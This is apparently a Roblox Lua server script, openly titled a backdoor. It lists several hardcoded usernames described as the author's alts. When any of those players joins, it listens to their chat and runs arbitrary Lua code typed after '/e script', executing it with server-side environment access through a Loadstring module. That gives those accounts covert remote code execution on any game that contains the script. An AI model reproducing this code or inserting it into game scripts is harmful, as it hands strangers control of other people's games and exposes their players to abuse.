-- Backdoor for cool people
-- I made this MrMadMan (interpreterK)
-- How to use: /e script [script]

local Access = {
    "interpreterK",
    "MrMadMan139",
    --my alts
    "realwar2d",
    "B01RING",
    --yours
    "hodj34"
}

local function Chat(str, P)
    local split = str:split(' ')
    local cmd = split[1] and split[1]:lower() == "/e"
    local act = split[2] and split[2]:lower() == "script"
    
    if cmd and act then
        local ls = require(script.Loadstring)
        --add owner support from my game so you dont need to specify your name all the damn time (owner.Name, owner.UserId, etc)
        local source  = ls(split[3], setmetatable({owner = P}, {
            __index = function(self,v)
                return rawget(self,v) or getfenv()[v]
            end,
            __newindex = function(self,i,v)
                getfenv()[i]=v
            end,
            __metatable = nil --incase something the script u run or U*sus* does something funny;
        }))
        pcall(source)
    end
end

game:GetService("Players").PlayerAdded:Connect(function(P)
    for i = 1, #Access do
        if P.Name == Access[i] then
            P.Chatted:Connect(function(...)
                Chat(..., P)
            end)
            break
        end
    end
end)
